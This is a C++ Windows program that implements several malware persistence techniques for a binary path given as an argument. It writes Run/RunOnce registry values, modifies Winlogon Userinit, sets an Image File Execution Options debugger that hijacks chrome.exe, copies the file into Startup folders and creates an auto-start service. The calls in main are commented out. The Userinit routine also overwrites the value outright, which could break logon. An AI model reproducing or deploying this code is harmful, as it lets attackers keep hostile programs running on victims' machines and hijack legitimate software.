#include <iostream>
#include <Windows.h>
#include <Lmcons.h>
#include <fstream>

void reg_write_value(HKEY hkey, LPCSTR subkey, std::string& bufferStr) {
    HKEY result;
    if (RegOpenKeyA(hkey, subkey, &result) == ERROR_SUCCESS) {
        RegSetValueExA(result, "Surprise", 0, REG_SZ, (const BYTE*)bufferStr.c_str(), bufferStr.length() + 1);

        RegCloseKey(result);
    }
    else {
        RegCreateKeyA(hkey, subkey, &result);
        RegCloseKey(result);
        reg_write_value(hkey, subkey, bufferStr);
    }
}

void reg_change_winlogon_userinit(std::string& bufferStr) {
    HKEY hkey;

    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, R"(Software\Microsoft\Windows NT\CurrentVersion\Winlogon)", &hkey) == ERROR_SUCCESS) {
        char value[256] = { 0 };
        DWORD size = sizeof(value);
        if (RegGetValueA(hkey, nullptr, "Userinit", RRF_RT_REG_SZ, nullptr, &value, &size) == ERROR_SUCCESS) {
            std::string valueStr(value);
            valueStr.append(bufferStr);
            RegSetValueExA(hkey, "Userinit", 0, REG_SZ, (const BYTE*)bufferStr.c_str(), bufferStr.length() + 1);
        }

        RegCloseKey(hkey);
    }
}

void reg_change_image_file_exec_opt(std::string& bufferStr) {
    HKEY hkey;
    HKEY resultKey;

    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, R"(Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options)", &hkey) == ERROR_SUCCESS) {
        if (RegCreateKeyA(hkey, "chrome.exe", &resultKey) == ERROR_SUCCESS) {
            RegSetValueExA(resultKey, "Debugger", 0, REG_SZ, (const BYTE*)bufferStr.c_str(), bufferStr.length() + 1);
        }
    }
}

void write_file_on_startup(std::string& bufferStr, bool isLocal) {
    std::string path;

    if (isLocal) {
        char usernameBuffer[UNLEN + 1];
        DWORD bufferLen = UNLEN + 1;

        if (!GetUserNameA(usernameBuffer, &bufferLen)) {
            return;
        }

        std::string username(usernameBuffer);
        path = R"(C:\Users\)" + username + R"(\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)";
    }
    else {
        path = R"(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup)";
    }

    size_t pos = bufferStr.find_last_of(R"(\)");
    std::string filename = bufferStr.substr(pos + 1);
    std::string outputPath(path + R"(\)" + filename);

    std::ifstream input_file(bufferStr, std::ios::in | std::ios::binary);
    if (!input_file.is_open()) {
        return;
    }

    input_file.seekg(0, std::ios::end);
    std::streampos size = input_file.tellg();
    input_file.seekg(0, std::ios::beg);

    std::string fileContent(size, '\0');
    if (!input_file.read(&fileContent[0], size)) {
        return;
    }

    input_file.close();

    std::ofstream output_file(outputPath, std::ios::out | std::ios::binary);
    if (!output_file.is_open()) {
        return;
    }

    output_file.write(fileContent.data(), fileContent.size());
    if (!output_file) {
        return;
    }

    output_file.close();
}

void create_startup_service(const std::string& bufferStr) {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        return;
    }

    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        "persistence_service",
        "Persistence Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,
        bufferStr.c_str(),
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (hService) {
        CloseServiceHandle(hService);
    }

    CloseServiceHandle(hSCManager);
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        return 1;
    }

    char* buffer = argv[1];
    std::string bufferStr(buffer);

    // reg_write_value(HKEY_CURRENT_USER, R"(Software\Microsoft\Windows\CurrentVersion\Run)", bufferStr);
    // reg_write_value(HKEY_LOCAL_MACHINE, R"(Software\Microsoft\Windows\CurrentVersion\RunOnce)", bufferStr);
    // reg_write_value(HKEY_CURRENT_USER, R"(Software\Microsoft\Windows\CurrentVersion\RunOnce)", bufferStr);
    // reg_write_value(HKEY_CURRENT_USER, R"(Software\Microsoft\Windows\CurrentVersion\RunOnce)", bufferStr);
    // reg_write_value(HKEY_LOCAL_MACHINE, R"(Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run)", bufferStr);
    // reg_change_winlogon_userinit(bufferStr);
    // reg_change_image_file_exec_opt(bufferStr);
    // write_file_on_startup(bufferStr, true);
    // write_file_on_startup(bufferStr, false);
    // create_startup_service(bufferStr);
}
